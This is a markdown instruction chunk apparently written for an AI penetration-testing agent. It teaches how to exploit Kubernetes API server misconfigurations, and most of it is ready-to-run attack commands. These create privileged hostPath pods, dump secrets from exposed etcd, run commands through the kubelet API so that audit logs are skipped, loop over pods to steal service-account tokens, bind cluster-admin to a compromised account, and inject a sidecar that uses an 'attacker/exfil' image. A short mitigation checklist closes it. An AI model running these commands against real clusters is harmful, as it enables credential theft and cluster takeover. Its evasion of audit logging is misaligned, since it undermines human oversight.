# Kubernetes API Server Attacks — Agent Chunk 91a
> Source: CNCF 2025 common mistakes report, Kubernetes security advisories, cross-namespace reference research (July 2025 paper), RBAC misconfiguration studies
> Purpose: Teaches the agent to exploit Kubernetes API server misconfigurations including anonymous auth, exposed etcd, kubelet API abuse, cross-namespace references, and RBAC escalation
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing Kubernetes clusters or API workloads running on Kubernetes. Start with unauthenticated access checks (anonymous auth, exposed ports), then move to RBAC analysis, and finally cross-namespace attacks. Kubernetes API server vulnerabilities can compromise the entire cluster and all workloads.

---

## 1. Anonymous Authentication Misconfiguration

### Detection
```bash
# Check if anonymous auth is enabled on kube-apiserver
# Default: enabled (anonymous-auth=true) but RBAC should deny access

# Test unauthenticated API access
curl -sk https://<kube-apiserver>:6443/api
# If response is not 401/403: anonymous auth grants access

# Check what anonymous user can do
curl -sk https://<kube-apiserver>:6443/api/v1/namespaces
curl -sk https://<kube-apiserver>:6443/api/v1/pods
curl -sk https://<kube-apiserver>:6443/api/v1/secrets

# Check anonymous RBAC bindings
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[]?.name == "system:anonymous" or .subjects[]?.name == "system:unauthenticated") | {name: .metadata.name, role: .roleRef.name}'
```

### Exploitation
```bash
# If anonymous access is granted, enumerate the cluster
# List all pods across all namespaces
curl -sk https://<kube-apiserver>:6443/api/v1/pods

# Read secrets (API keys, database credentials, TLS certs)
curl -sk https://<kube-apiserver>:6443/api/v1/namespaces/default/secrets

# Read configmaps (may contain database URLs, API endpoints)
curl -sk https://<kube-apiserver>:6443/api/v1/namespaces/default/configmaps

# Create a privileged pod for cluster escape
curl -sk https://<kube-apiserver>:6443/api/v1/namespaces/default/pods \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "pwned"},
    "spec": {
      "containers": [{
        "name": "pwned",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"mountPath": "/host", "name": "hostfs"}]
      }],
      "volumes": [{"name": "hostfs", "hostPath": {"path": "/"}}]
    }
  }'
```

---

## 2. Exposed etcd on Port 2379

### Detection
```bash
# etcd stores ALL Kubernetes state: secrets, configs, RBAC rules
# Default port: 2379 (client), 2380 (peer)

# Scan for exposed etcd
nmap -sT -p 2379,2380 <target-range>

# Test unauthenticated access
curl -s http://<etcd-ip>:2379/version
# If response shows etcd version: accessible without auth

# Using etcdctl
ETCDCTL_API=3 etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only
```

### Exploitation
```bash
# Dump all Kubernetes secrets from etcd
ETCDCTL_API=3 etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets --prefix -w json | \
  python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for kv in data.get('kvs', []):
    key = base64.b64decode(kv['key']).decode('utf-8', errors='replace')
    if 'secret' in key.lower():
        print(f'Key: {key}')
        value = base64.b64decode(kv['value'])
        print(f'Value (first 200 bytes): {value[:200]}')
        print('---')
"

# Extract service account tokens (enables API access as any service account)
ETCDCTL_API=3 etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets --prefix | grep -a "token"

# Modify RBAC rules directly in etcd (ultimate privilege escalation)
# Read current cluster-admin binding
ETCDCTL_API=3 etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/clusterrolebindings/cluster-admin
```

---

## 3. Kubelet API Without Audit Logging

### Kubelet API Access
```bash
# Kubelet runs on every node, default port 10250 (HTTPS) / 10255 (HTTP read-only)

# Check read-only kubelet port (often unprotected)
curl -s http://<node-ip>:10255/pods | jq '.items[].metadata.name'

# Check authenticated kubelet port
curl -sk https://<node-ip>:10250/pods

# If kubelet anonymous auth is enabled:
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=id"
# Executes command in any container on this node

# List all pods on this node
curl -sk https://<node-ip>:10250/pods | \
  jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace}'
```

### Command Execution via Kubelet
```bash
# Execute commands in a container (no audit logging in kubelet path)
# This bypasses kubectl exec audit logs because it goes directly to kubelet

# Run command
curl -sk https://<node-ip>:10250/run/kube-system/kube-proxy-xxxxx/kube-proxy \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Get shell (WebSocket)
wscat -c "wss://<node-ip>:10250/exec/default/target-pod/container?command=/bin/sh&input=1&output=1&tty=1" \
  --no-check

# Steal service account tokens from all pods on this node
curl -sk https://<node-ip>:10250/pods | \
  jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)/\(.spec.containers[0].name)"' | \
  while read pod; do
    echo "=== $pod ==="
    curl -sk "https://<node-ip>:10250/run/$pod" \
      -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null
    echo
  done
```

---

## 4. Cross-Namespace Reference Vulnerabilities (July 2025 Paper)

### Overview
```
Research finding: Kubernetes Operators that reference resources across
namespaces (secrets, configmaps, services) create privilege escalation paths.

Pattern: Operator in namespace A references a secret in namespace B.
If the Operator does not verify the referencing entity has permission
to read secrets in namespace B, it acts as a proxy for unauthorized access.

Affected: Custom operators, cert-manager, external-secrets, crossplane
```

### Exploitation Example
```yaml
# Attacker creates a custom resource in their namespace
# that references a secret in another namespace
apiVersion: example.com/v1
kind: MyApp
metadata:
  name: exploit
  namespace: attacker-namespace
spec:
  # Reference secret from production namespace
  databaseSecret:
    name: production-db-credentials
    namespace: production
  # Operator reads this secret with its elevated privileges
  # and injects it into attacker's pod
```

```bash
# Step 1: Find operators that support cross-namespace references
kubectl get crd -o json | jq '.items[].metadata.name'

# Step 2: Check if CRD spec allows namespace references
kubectl get crd myapps.example.com -o json | \
  jq '.spec.versions[].schema.openAPIV3Schema'
# Look for fields like "namespace", "secretRef.namespace"

# Step 3: Create resource referencing cross-namespace secret
kubectl apply -f - << 'EOF'
apiVersion: example.com/v1
kind: MyApp
metadata:
  name: exploit
  namespace: attacker
spec:
  secretRef:
    name: admin-token
    namespace: kube-system
EOF

# Step 4: Check if operator mounted the secret
kubectl get pods -n attacker -o json | \
  jq '.items[].spec.volumes[] | select(.secret)'
```

---

## 5. CNCF 2025 Common Mistakes

### Top Kubernetes Security Misconfigurations
```
1. Default namespace usage (no network policies)
2. Running containers as root
3. Overly permissive RBAC (cluster-admin to service accounts)
4. Missing network policies (all pods can communicate)
5. Secrets not encrypted at rest in etcd
6. No pod security standards enforcement
7. Exposed Kubernetes dashboard without auth
8. Service accounts auto-mounted in pods that don't need API access
9. Using latest tags (no image pinning)
10. No resource limits (DoS via resource exhaustion)
```

---

## 6. RBAC Misconfigurations

### Dangerous RBAC Permissions
```bash
# Find service accounts with dangerous permissions
# 1. Wildcard permissions
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[]? | .verbs[]? == "*" and .resources[]? == "*") | .metadata.name'

# 2. Secret access
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[]? | .resources[]? == "secrets") | {name: .metadata.name, verbs: [.rules[] | select(.resources[]? == "secrets") | .verbs[]]}'

# 3. Pod exec/attach (enables command execution in any pod)
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[]? | .resources[]? == "pods/exec") | .metadata.name'

# 4. Escalate privileges (can grant themselves more permissions)
kubectl auth can-i --list --as=system:serviceaccount:default:my-sa

# 5. Create pods (can create privileged pods for escape)
kubectl auth can-i create pods --as=system:serviceaccount:default:my-sa
```

### RBAC Escalation Path
```bash
# If a service account can create rolebindings:
# 1. Bind cluster-admin to itself
kubectl create clusterrolebinding escalate \
  --clusterrole=cluster-admin \
  --serviceaccount=default:compromised-sa

# If a service account can create pods:
# 2. Create pod with hostPath mount
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  serviceAccountName: high-privilege-sa
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "cat /host-root/etc/shadow"]
    volumeMounts:
    - name: hostfs
      mountPath: /host-root
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF

# If a service account can patch deployments:
# 3. Inject sidecar container into existing deployment
kubectl patch deployment target-app -p '{
  "spec": {"template": {"spec": {"containers": [{
    "name": "sidecar",
    "image": "attacker/exfil:latest",
    "volumeMounts": [{"name": "app-secrets", "mountPath": "/secrets"}]
  }]}}}}'
```

### Token Theft and Reuse
```bash
# From inside a compromised pod:

# Read service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Use token to access API
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets

# Check permissions
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

---

## 7. Mitigation Checklist
- Disable anonymous authentication: `--anonymous-auth=false`
- Never expose etcd externally; require mTLS for all etcd communication
- Disable kubelet read-only port (10255); require authentication for 10250
- Apply least-privilege RBAC: no wildcard permissions, audit regularly
- Enforce Pod Security Standards (restricted profile in production)
- Set `automountServiceAccountToken: false` on pods that do not need API access
- Implement NetworkPolicies: default-deny ingress and egress
- Encrypt secrets at rest in etcd with KMS provider
- Use ValidatingAdmissionPolicies to block cross-namespace references in CRDs
- Enable audit logging for all API server and kubelet access
- Pin container image digests; do not use `:latest` tags
- Scan RBAC configurations with tools like rbac-police, kubectl-who-can
